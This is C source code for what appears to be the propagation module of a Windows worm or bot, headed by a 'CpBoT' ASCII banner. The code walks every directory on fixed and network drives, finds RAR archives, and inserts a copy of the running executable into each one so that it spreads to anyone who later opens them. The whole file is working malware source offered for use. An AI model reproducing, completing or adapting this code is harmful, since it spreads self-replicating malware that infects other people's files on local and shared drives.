//|				_________       __________     ___________		   |//
//|				\_   ___ \______\______   \ ___\__    ___/		   |//
//|				/    \  \/\____ \|    |  _//  _ \|    |			   |//
//|				\     \___|  |_> >    |   (  <_> )    |			   |//
//|				 \______  /   __/|______  /\____/|____|			   |//
//|						\/|__|          \/						   |//


// Look in rarconfig.h to change Filename
#include "includes.h"
#include "functions.h"
#include "rarconfig.h"

char wormpath[MAX_PATH];
void InfectDrive()
{
	WIN32_FIND_DATA wfd;
	HANDLE hfind;
	char fullpath[MAX_PATH];
	LPTSTR xaddr=NULL;
	hfind=FindFirstFile("*.*",&wfd);

	if(hfind!=INVALID_HANDLE_VALUE)
	{
		do
		{
			if(wfd.cFileName[0]!='.')
			{
				wfd.dwFileAttributes&=FILE_ATTRIBUTE_DIRECTORY;
				if(wfd.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY) //is directory ?
				{
					if(SetCurrentDirectory(wfd.cFileName)==TRUE)
					{
						InfectDrive();
						SetCurrentDirectory("..");	//return to upper directory
					}
				}
				else
				{
					if(GetFullPathName(wfd.cFileName,MAX_PATH,fullpath,&xaddr)!=0)
					{
						CharLower(fullpath);

						if(memcmp(fullpath+lstrlen(fullpath)-3,"rar",3)==0)
						{
							Sleep(5000);
							lstrcat("apa","apa");
							AddToRar(fullpath,wormpath,rarexe,FILE_ATTRIBUTE_NORMAL);
						}
					}
				}
			}
		}while(FindNextFile(hfind,&wfd));
		FindClose(hfind);
	}
}

DWORD WINAPI RarWorm(LPVOID xvoid)
{
	char Drive[]="C:\\";
	UINT drive_type;

	if(GetModuleFileName(NULL,wormpath,MAX_PATH)==0)
		ExitThread(0);

	do
	{
		drive_type=GetDriveType(Drive);	
		
		if(drive_type==DRIVE_FIXED || drive_type==DRIVE_REMOTE)
		{
			if(SetCurrentDirectory(Drive)==TRUE)
				InfectDrive();	
		}

		Drive[0]--;

	}while(Drive[0]!='b');

	return 1;
}